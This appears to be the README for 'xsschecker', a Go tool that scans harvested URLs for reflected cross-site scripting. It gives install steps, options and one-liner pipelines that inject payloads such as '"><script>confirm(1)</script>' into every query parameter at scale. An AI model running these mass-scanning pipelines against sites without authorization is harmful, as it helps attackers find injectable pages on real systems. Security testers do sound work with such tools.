```
 _  _  ____  ____   ___  _  _  ____  ___  __ _  ____  ____ 
( \/ )/ ___)/ ___) / __)/ )( \(  __)/ __)(  / )(  __)(  _ \
 )  ( \___ \\___ \( (__ ) __ ( ) _)( (__  )  (  ) _)  )   /
(_/\_)(____/(____/ \___)\_)(_/(____)\___)(__\_)(____)(__\_)
```

<h3 align="center">xsschecker tool checking reflected endpoints finding possible xss vulnerable endpoints.</h3>

## Install
```
go install github.com/rix4uni/xsschecker@latest
```
or

```
git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker ~/go/bin/xsschecker && cd .. && rm -rf xsschecker
```
## Usage
```
xsschecker -h
Usage: xsschecker [OPTIONS]

Options:
  -H string
        Custom User-Agent header for HTTP requests. (default "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")
  -ao string
        File to append the output instead of overwriting.
  -i string
        Input file containing list of URLs.
  -match string
        The string(s) to match against the domain response. Separate multiple strings with commas. (required) (default "alert(1), confirm(1), prompt(1)")
  -maxssc int
        Maximum number of status code responses required before skipping all URLs from that domain, This flag only can be use with -ssc flag. (default 20)
  -nc
        Do not use colored output.
  -o string
        File to save the output.
  -proxy string
        Proxy server for HTTP requests. (e.g., http://127.0.0.1:8080)
  -retries int
        Number of retry attempts for failed HTTP requests. (default 1)
  -scdn string
        Comma-separated server names to skip all URLs for (e.g., "cloudflare,AkamaiGHost,CloudFront,Imperva").
  -ssc string
        Comma-separated status codes to skip all URLs from a domain if encountered (e.g., 403,400).
  -t int
        Number of concurrent threads. (default 20)
  -timeout int
        Timeout for HTTP requests in seconds. (default 15)
  -u string
        Single URL to test.
  -v    Enable verbose output for debugging purposes.
  -version
        Print the version of the tool and exit.
  -vuln
        If set, only vulnerable URLs will be printed.
```

## Reflected XSS Mass Automation
```
cat subs.txt | waybackurls >> waybackurls-urls.txt
cat subs.txt | gau >> gau-urls.txt
cat live-subs.txt | hakrawler -scope >> hakrawler-urls.txt
cat waybackurls-urls.txt gau-urls.txt hakrawler-urls.txt | anew -q urls.txt

cat urls.txt | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
```

## Reflected XSS Oneliner Command1
```
echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
```

## Reflected XSS Oneliner Command2
```
echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln

or

echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>, "<image/src/onerror=confirm(1)>' -vuln
```

## Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
![image](https://github.com/rix4uni/xsschecker/assets/72344025/8034668c-42c3-47b1-9fee-5a58c2c96d63)

